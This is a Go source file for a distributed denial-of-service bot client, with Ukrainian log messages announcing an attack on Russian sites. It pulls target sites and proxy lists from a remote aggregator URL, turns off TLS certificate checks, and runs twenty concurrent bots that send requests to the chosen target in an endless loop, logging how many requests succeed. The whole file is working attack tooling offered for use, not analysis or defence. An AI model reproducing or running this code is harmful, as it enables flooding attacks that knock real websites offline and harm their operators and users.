package main

import (
	"context"
	"crypto/tls"
	"math/rand"
	"net/http"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

const (
	HOST_AGGREGATOR         = "http://rockstarbloggers.ru/hosts.json"
	NUM_OF_BOTS             = 20
	NUM_OF_REQUST_PER_EPOCH = 1
)

var DefClient *http.Client

func init() {
	// Setup
	rand.Seed(time.Now().UnixNano())

	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	tr.IdleConnTimeout = time.Second * 5
	tr.ResponseHeaderTimeout = time.Second * 5
	tr.ReadBufferSize = 100

	DefClient = &http.Client{Transport: tr}
}

func main() {
	// TODO: graceful shutdown
	// sigs := make(chan os.Signal, 1)
	// signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	for epoch := 0; true; epoch++ {
		ctx, termBots := context.WithCancel(context.Background())

		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", NUM_OF_REQUST_PER_EPOCH)

		src, err := GetSrcURL()
		if err != nil {
			log.Infof("Отримуємо списки джерел: %v\n", err)
			continue
		}
		log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)

		srcRsp, err := GetDataFromSrc(src)
		if err != nil {
			log.Errorf("Не вдалося отримати дані від джерела: %v\n", err)
			continue
		}
		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n", srcRsp.Site.URL, len(srcRsp.Proxies))

		var (
			wg sync.WaitGroup
		)

		counter := make(chan bool, NUM_OF_BOTS)

		if err := StartBots(ctx, &wg, srcRsp, NUM_OF_BOTS, counter); err != nil {
			log.Errorf("Не вдалося запустити ботів: %v\n", err)
			continue
		}

		wg.Add(1)
		go func() {
			defer wg.Done()
			totalRequstSent := 0
			successRequestSent := 0
			for {
				select {
				case <-ctx.Done():
				default:
				}

				select {
				case <-ctx.Done():
				case v := <-counter:
					totalRequstSent++
					if v {
						successRequestSent++
					}

					log.Infof("Успішних запитів: %d/%d\n", successRequestSent, totalRequstSent)

					if totalRequstSent > NUM_OF_REQUST_PER_EPOCH {
						termBots()
						return
					}
				}
			}
		}()

		wg.Wait()
	}
}
